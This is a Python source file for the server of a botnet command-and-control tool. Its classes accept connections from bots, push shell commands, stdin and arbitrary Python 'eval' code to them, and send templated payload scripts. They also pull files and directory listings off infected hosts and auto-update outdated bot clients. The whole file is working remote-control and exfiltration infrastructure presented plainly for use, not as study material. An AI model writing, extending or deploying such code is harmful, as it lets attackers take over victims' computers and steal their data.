import importlib
from distutils.version import LooseVersion
import json
import pickle
from threading import Thread, Condition
from threading import Lock
import select
import base64
import uuid
import os
import sys

try:
    from server import formatsock, server
    from server.client import client
except:
    import formatsock
    import server
    from client import client

MIN_CLIENT_VERSION = client.__version__

class BotNet(Thread):
    INPUT_TIMEOUT = 1
    PRINTOUT_JSON = 'printout'
    ERROUT_JSON = 'errout'
    STDOUT_JSON = 'stdout'
    STDERR_JSON = 'stderr'
    SPEC_JSON = 'special'
    FILESTREAM_JSON = 'filestreams'
    FILECLOSE_JSON = 'fileclose'
    LS_JSON = 'ls'
    FILESIZE_JSON = 'filesize'

    def __init__(self, socketio, payloadpath="payloads", downloadpath="media/downloads"):
        super().__init__()
        self.connlock = Lock()
        self.conncon = Condition(self.connlock)
        self.allConnections = {}
        self.socketio = socketio
        self.filemanager = BotNetFileManager(downloadpath)
        self.payloadmanager = BotNetPayloadManager(payloadpath)
        self.downloaddir = downloadpath

    def addConnection(self, user, conn):
        with self.connlock:
            if user in self.allConnections:
                pass  # TODO: How to deal with duplicate usernames?
            self.allConnections[user] = conn
            self.conncon.notifyAll()
            # Notify recv thread

    def removeConnection(self, user):
        # Will be making changes to allConnections
        with self.connlock:
            if user in self.allConnections:
                # Wait for any sends to go through for this bot
                # terminate and remove
                try:
                    self.allConnections[user].close()
                except:
                    pass
                # Remove object, don't delete so sends still go through
                self.allConnections.pop(user)
                self.socketio.emit('disconnect', {'user': user}, namespace='/bot')
                print("[-] Lost connection to {}".format(user))

    def getConnections(self):
        with self.connlock:
            return self.allConnections.keys()

    def run(self):
        while True:
            with self.connlock:
                bots = list(self.allConnections.values())
                while len(bots) == 0:
                    self.conncon.wait()
                    bots = list(self.allConnections.values())
            # Waiting for bot input, rescan for new bots every INPUT_TIMEOUT
            # TODO maybe use pipe as interrupt instead of timeout?
            rs, _, _ = select.select(bots, [], [], BotNet.INPUT_TIMEOUT)
            # We now have a tuple of all bots that have sent data to the botnet
            for bot in rs:
                user = bot.user
                try:
                    msg = bot.recv()
                    jsonobj = json.loads(msg.decode('UTF-8'))
                    printout = ""
                    errout = ""
                    out = ""
                    err = ""
                    special = {}
                    filestream = {}
                    fileclose = []

                    if BotNet.PRINTOUT_JSON in jsonobj:
                        printout = jsonobj[BotNet.PRINTOUT_JSON]
                    if BotNet.ERROUT_JSON in jsonobj:
                        errout = jsonobj[BotNet.ERROUT_JSON]
                    if BotNet.STDOUT_JSON in jsonobj:
                        out = jsonobj[BotNet.STDOUT_JSON].rstrip()
                    if BotNet.STDERR_JSON in jsonobj:
                        err = jsonobj[BotNet.STDERR_JSON].rstrip()
                    if BotNet.SPEC_JSON in jsonobj:
                        special = jsonobj[BotNet.SPEC_JSON]
                    if BotNet.FILESTREAM_JSON in jsonobj:
                        filestream = jsonobj[BotNet.FILESTREAM_JSON]
                    if BotNet.FILECLOSE_JSON in jsonobj:
                        fileclose = jsonobj[BotNet.FILECLOSE_JSON]

                    # Forward stdout/stderr... as needed
                    self.socketio.emit('response',
                                       {'user': user,
                                        'printout': printout,
                                        'errout': errout,
                                        'stdout': out,
                                        'stderr': err},
                                       namespace="/bot")

                    if len(special) > 0:
                        if BotNet.LS_JSON in special:
                            self.socketio.emit('finder',
                                               {'special': special,
                                                'user': user},
                                               namespace="/bot")
                        if BotNet.FILESIZE_JSON in special:
                            fileinfo = json.loads(special[BotNet.FILESIZE_JSON])
                            self.filemanager.setFileSize(user,fileinfo['filename'],fileinfo['filesize'])

                    # Forward file bytes as needed
                    for filename in filestream.keys():
                        # Get the b64 encoded bytes from the client in string form, change to normal bytes
                        filebytes = base64.b64decode(filestream[filename])
                        self.filemanager.appendBytesToFile(user, filename, filebytes)

                    for filename in fileclose:
                        self.filemanager.closeFile(user, filename)

                except IOError:
                    # Connection was interrupted
                    self.removeConnection(user)

    def sendStdin(self, user, cmd):
        with self.connlock:
            if user in self.allConnections:
                self.allConnections[user].send(cmd, type="stdin")
                return True
            self.socketio.emit('response',
                               {'stdout': '', 'stderr': 'Client {} no longer connected.'.format(user), 'user': user})
            return False

    def sendCmd(self, user, cmd):
        with self.connlock:
            if user in self.allConnections:
                self.allConnections[user].send(cmd, type="cmd")
                return True
            self.socketio.emit('response',
                               {'stdout': '', 'stderr': 'Client {} no longer connected.'.format(user), 'user': user})
            return False

    def sendEval(self, user, cmd):
        with self.connlock:
            if user in self.allConnections:
                self.allConnections[user].send(cmd, type="eval")
                return True
            self.socketio.emit('response',
                               {'stdout': '', 'stderr': 'Client {} no longer connected.'.format(user), 'user': user})
            return False

    def sendFile(self, user, filename, fileobj):
        with self.connlock:
            if user in self.allConnections:
                self.allConnections[user].sendFile(filename, fileobj)
                return True
            self.socketio.emit('response',
                               {'stdout': '', 'stderr': 'Client {} no longer connected.'.format(user), 'user': user})
            return False

    def startFileDownload(self, user, filename):
        with self.connlock:
            if user in self.allConnections:
                self.allConnections[user].startFileDownload(filename)
                return True
            return None

    def getPayloadNames(self):
        return self.payloadmanager.getPayloadNames()

    def getPayloads(self):
        return self.payloadmanager.getPayloads()

    def sendPayload(self, user, payload, args):
        payloadtext = self.payloadmanager.getPayloadText(payload, args)
        if payloadtext:
            return self.sendEval(user, payloadtext)
        else:
            return False

    def requestLs(self, user, filename):
        with self.connlock:
            if user in self.allConnections:
                self.allConnections[user].requestLs(filename)

    def getFileManager(self):
        return self.filemanager

    def getDownloadFiles(self):
        return self.filemanager.getFilesAndInfo()

    def getFileName(self, user, filename):
        return self.filemanager.getFileName(user,filename)

    def deleteFile(self, user, filename):
        return self.filemanager.deleteFile(user,filename)


class BotServer(Thread):
    def __init__(self, tcpsock, botnet, socketio):
        Thread.__init__(self)
        self.tcpsock = tcpsock
        self.botnet = botnet
        self.socketio = socketio
        self.clientversion = LooseVersion(MIN_CLIENT_VERSION)

    def run(self):
        while True:
            self.tcpsock.listen(5)
            (clientsock, (ip, port)) = self.tcpsock.accept()
            clientformatsock = formatsock.FormatSocket(clientsock)
            msgbytes = clientformatsock.recv()
            host_info = json.loads(msgbytes.decode('UTF-8'))

            user = host_info['user'].strip()
            botversion = LooseVersion(host_info['version'])
            bot = Bot(clientsock, host_info, self.socketio)
            if botversion < self.clientversion:
                # Autoupdate
                print("[*] Updating {} on version {}".format(user, botversion))
                bot.sendClientFile(open(os.path.abspath(client.__file__), 'rb'))
            else:
                print("[+] Received connection from {}".format(user))
                self.botnet.addConnection(user, bot)
                self.socketio.emit('connection', {'user': user}, namespace='/bot')

class Bot:
    FILE_SHARD_SIZE = 4096
    FILE_STREAM = 'fstream'
    FILE_CLOSE = 'fclose'
    FILE_FILENAME = 'fname'
    CLIENT_STREAM = 'cstream'
    CLIENT_CLOSE = 'cclose'
    FILE_DOWNLOAD = 'down'
    LS_JSON = 'ls'

    def __init__(self, sock, host_info, socketio):
        self.sock = formatsock.FormatSocket(sock)
        self.arch = host_info['arch'][:-1]
        self.user = host_info['user'][:-1]
        self.botlock = Lock()
        self.socketio = socketio

    def send(self, cmd, type="stdin"):
        json_str = json.dumps({type: cmd})
        with self.botlock:
            self.sock.send(json_str)

    def recv(self):
        return self.sock.recv()

    def close(self):
        with self.botlock:
            self.sock.close()

    def fileno(self):
        '''
        Returns the OS fileno of the underlying socket, that way the
        OS can wait for IO on the fileno and allow us to serve many bots
        simultaneously
        '''
        return self.sock.fileno()

    def sendFile(self, filename, fileobj):
        # TODO: single worker thread instead of new one?
        t = Thread(target=self.__sendFileHelper(fileobj, filename))
        t.start()

    def sendClientFile(self, fileobj):
        self.sendFile(None, fileobj)

    def __sendFileHelper(self, fileobj, filename=None):
        with self.botlock:
            dat = fileobj.read(Bot.FILE_SHARD_SIZE)
            if len(dat) > 0:
                while len(dat) > 0:
                    # Turn the bytes into b64 encoded bytes, then into string
                    bytestr = base64.b64encode(dat).decode('UTF-8')
                    if filename:
                        # Particular file
                        json_str = json.dumps({Bot.FILE_STREAM: bytestr, Bot.FILE_FILENAME: filename})
                    else:
                        # Client file
                        json_str = json.dumps({Bot.CLIENT_STREAM: bytestr})
                    self.sock.send(json_str)
                    dat = fileobj.read(Bot.FILE_SHARD_SIZE)
                if filename:
                    json_str = json.dumps({Bot.FILE_CLOSE: filename})
                else:
                    json_str = json.dumps({Bot.CLIENT_CLOSE: True})
                self.sock.send(json_str)
                fileobj.close()
                self.socketio.emit('success', {'user': self.user, 'message': "File upload successful"},
                                   namespace='/bot')

    def startFileDownload(self, filename):
        with self.botlock:
            json_str = json.dumps({Bot.FILE_DOWNLOAD: filename})
            self.sock.send(json_str)

    def requestLs(self, filename):
        with self.botlock:
            json_str = json.dumps({Bot.LS_JSON: filename})
            self.sock.send(json_str)

class BotNetFileManager:
    FILENAME_OBJFILE = 'filenames.json'

    # TODO: change to separate locks for each file
    def __init__(self,outputdir):
        '''
        Contains internal json object, doesn't need to update file for current bytes,
        only for names, close, and maxbytes
        :param outputdir: directory for storing downloads
        '''
        self.fileobjs = {}
        self.filedets = {}
        self.lock = Lock()
        self.outputdir = outputdir
        self.filenamefile = os.path.join(outputdir,BotNetFileManager.FILENAME_OBJFILE)
        if os.path.exists(self.filenamefile):
            with open(self.filenamefile,"rb") as jsonfile:
                self.filedets = pickle.load(jsonfile)
                for uf in list(self.filedets.keys()):
                    filepath = self.filedets[uf][0]
                    if not os.path.exists(filepath):
                        self.filedets.pop(uf)
            with open(self.filenamefile, "wb") as jsonfile:
                pickle.dump(self.filedets, jsonfile)

    def appendBytesToFile(self, user, filename, wbytes):
        uf = (user, filename)
        with self.lock:
            if uf not in self.fileobjs:
                filename = str(uuid.uuid4())
                self.fileobjs[uf] = open(os.path.join(self.outputdir, filename), "wb")
                self.filedets[uf] = [filename,0,0]
                with open(self.filenamefile,"wb") as jsonfile:
                    pickle.dump(self.filedets, jsonfile)
            if not self.fileobjs[uf].closed:
                self.fileobjs[uf].write(wbytes)
                self.filedets[uf][1] += len(wbytes)

    def closeFile(self, user, filename):
        uf = (user, filename)
        with self.lock:
            if not self.fileobjs[uf].closed:
                self.fileobjs[uf].close()
            self.fileobjs.pop(uf)
            with open(self.filenamefile, "wb") as jsonfile:
                pickle.dump(self.filedets, jsonfile)

    def setFileSize(self, user, filename, filesize):
        uf = (user, filename)
        with self.lock:
            if uf not in self.fileobjs:
                filename = os.path.join(self.outputdir, str(uuid.uuid4()))
                self.fileobjs[uf] = open(filename, "wb")
                self.filedets[uf] = [filename, 0, filesize]
            else:
                self.filedets[uf][2] = filesize
            with open(self.filenamefile, "wb") as jsonfile:
                pickle.dump(self.filedets, jsonfile)

    def getFilesAndInfo(self):
        '''
        Creates a list of fileinfo objects with {user, filename, size, downloaded}
        :return:
        '''
        # Get (user,file) list
        with self.lock:
            ufilenames = self.filedets.keys()

            fileinfo = []
            for key in ufilenames:
                (user, filename) = key
                uuidname, downloaded, size = self.filedets[key]
                fileinfo.append(dict(user=user,filename=filename,size=size,downloaded=downloaded))
            return fileinfo

    def getFileName(self, user, filename):
        uf = (user, filename)
        with self.lock:
            if uf in self.filedets:
                return self.filedets[uf][0]
            else:
                return None

    def deleteFile(self, user, filename):
        uf = (user, filename)
        with self.lock:
            if uf in self.filedets:
                if uf in self.fileobjs:
                    self.fileobjs[uf].close()
                real_filename = self.filedets[uf][0]
                self.filedets.pop(uf)
                os.remove(real_filename)
                with open(self.filenamefile, "wb") as jsonfile:
                    pickle.dump(self.filedets, jsonfile)
                return True
            return False

class BotNetPayloadManager:
    PAYLOAD_EXT = '.py'
    COMMENT_DELIMIT = ['"""',"'''"]
    VAR_DENOTE = 'VAR'

    def __init__(self, payloadpath):
        self.payloaddescriptions = {}
        self.payloadfiles = {}
        self.payloadpath = payloadpath
        for root, dirs, files in os.walk(self.payloadpath):
            for file in files:
                if file.endswith(BotNetPayloadManager.PAYLOAD_EXT):
                    filepath = os.path.join(root, file)
                    name, desc = self.parsePayload(filepath)
                    self.payloaddescriptions[name] = desc
                    self.payloadfiles[name] = filepath

    def getPayloads(self):
        return self.payloaddescriptions

    def getPayloadNames(self):
        return [payload for payload in self.payloaddescriptions.keys()]

    def parsePayload(self,payloadpath):
        with open(payloadpath,"r") as f:
            payloadlines = f.readlines()
        payloaddict = dict(name=payloadpath[len(self.payloadpath)+1:-len(BotNetPayloadManager.PAYLOAD_EXT)],
                           description='',
                           vars={})
        try:
            if payloadlines[0].strip() in BotNetPayloadManager.COMMENT_DELIMIT:
                for i in range(1,len(payloadlines)):
                    payloadline = payloadlines[i]

                    if payloadline in BotNetPayloadManager.COMMENT_DELIMIT:
                        break
                    elif ':' in payloadline:
                        indx = payloadline.index(':')
                        lhs, rhs = payloadline[:indx].strip(), payloadline[indx+1:].strip()
                        if lhs.startswith(BotNetPayloadManager.VAR_DENOTE):
                            var = lhs[len(BotNetPayloadManager.VAR_DENOTE):].strip()
                            payloaddict['vars'][var] = rhs
                        else:
                            payloaddict[lhs.lower()] = rhs
        except Exception as e:
            sys.stderr.write("[!] Error parsing {}: {}\n".format(payloadpath,str(e)))
            sys.stderr.flush()
        return payloaddict['name'], payloaddict

    def getPayloadText(self, payload, args):
        if payload not in self.payloaddescriptions:
            return None
        vars = self.payloaddescriptions[payload]['vars']
        vartext = ""
        for reqvar in vars.keys():
            if reqvar in args:
                vartext += '{}="{}"\n'.format(reqvar,args[reqvar])
            else:
                return None
        with open(self.payloadfiles[payload],"r") as f:
            payloadtext = f.read()
            return vartext+payloadtext